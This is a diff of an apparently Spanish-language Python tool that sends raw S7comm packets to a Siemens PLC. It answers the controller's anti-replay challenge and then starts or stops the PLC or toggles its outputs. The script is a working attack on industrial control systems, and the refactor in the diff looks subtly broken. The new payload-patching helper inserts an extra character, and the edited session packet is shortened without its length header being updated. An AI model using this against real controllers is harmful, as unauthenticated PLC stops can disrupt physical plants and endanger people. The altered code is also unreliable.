@@ -43,7 +43,6 @@ def fConectar(pHost):
     print(f"\n  Error al conectar con el PLC: {e}")
     return None
 
-
 def fEnviarPayload(pData, pSocket):
   print(f"Intentando enviar: {pData}")
   pSocket.send(bytearray.fromhex(pData))
@@ -56,9 +55,19 @@ def fEnviarPayload(pData, pSocket):
       print("\n  No se recibió respuesta del PLC. \n")
     return vResp
   except socket.timeout:
-    print(cColorRojo + f"\n  Se esperó 5 segundos y el PLC no respondió: {e}" + cFinColor)
+    print("\n  Se esperó 5 segundos y el PLC no respondió.")
     return None
 
+def fCalcularAntiReplay(data):
+  """ Extrae el challenge y calcula el valor anti-replay. """
+  vChallenge = data.hex()[48:50]  # Extrae el byte del challenge
+  vAntiReplay = int(vChallenge, 16) + 0x80  # Suma 0x80
+  return vAntiReplay
+
+def fModificarPayload(pPayload, pAntiReplay):
+  """ Modifica el payload con el valor anti-replay calculado. """
+  vAntiHex = hex(pAntiReplay)[2:].zfill(2)  # Asegurar formato hexadecimal de 2 caracteres
+  return pPayload[:46] + vAntiHex[0] + pPayload[47:48] + vAntiHex[1] + pPayload[48:]
 
 def fEncenderPLC(pHost):
   vSocketPLC = fConectar(pHost)
@@ -66,7 +75,7 @@ def fEncenderPLC(pHost):
     return
 
   vSolCommCOTP =     '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-  vSolCommS7 =       '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vSolCommS7 =       '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
   vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
 
   fEnviarPayload(vSolCommCOTP, vSocketPLC)
@@ -74,21 +83,21 @@ def fEncenderPLC(pHost):
   if not data:
     vSocketPLC.close()
     return
-  vChallenge = data.hex()[48:50]
-  vAntiReplay = int(vChallenge, 16) + int("80", 16)
-  vPayloadEncender = vPayloadEncender[:46] + hex(anti)[2] + vPayloadEncender[47:]
-  vPayloadEncender = vPayloadEncender[:47] + hex(anti)[3] + vPayloadEncender[48:]
+
+  vAntiReplay = fCalcularAntiReplay(data)
+  vPayloadEncender = fModificarPayload(vPayloadEncender, vAntiReplay)
+
   fEnviarPayload(vPayloadEncender, vSocketPLC)
   print("\n  PLC iniciado correctamente \n.")
   vSocketPLC.close()
-
 
 def fApagarPLC(vHost):
   vSocketPLC = fConectar(vHost)
   if not vSocketPLC:
     return
+
   vSolCommCOTP =   '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
-  vSolCommS7 =     '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vSolCommS7 =     '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
   vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
 
   fEnviarPayload(vSolCommCOTP, vSocketPLC)
@@ -96,10 +105,10 @@ def fApagarPLC(vHost):
   if not data:
     vSocketPLC.close()
     return
-  challenge = data.hex()[48:50]
-  anti = int(challenge, 16) + int("80", 16)
-  vPayloadApagar = vPayloadApagar[:46] + hex(anti)[2] + vPayloadApagar[47:]
-  vPayloadApagar = vPayloadApagar[:47] + hex(anti)[3] + vPayloadApagar[48:]
+
+  vAntiReplay = fCalcularAntiReplay(data)
+  vPayloadApagar = fModificarPayload(vPayloadApagar, vAntiReplay)
+
   fEnviarPayload(vPayloadApagar, vSocketPLC)
   print("\n  PLC detenido correctamente. \n")
   vSocketPLC.close()
@@ -223,7 +232,7 @@ def fMenu(stdscr, vHost):
     "  Apagar salida %Q0.9",
     "Salir"
   ]
-  
+
   current_row = 0
 
   while True:
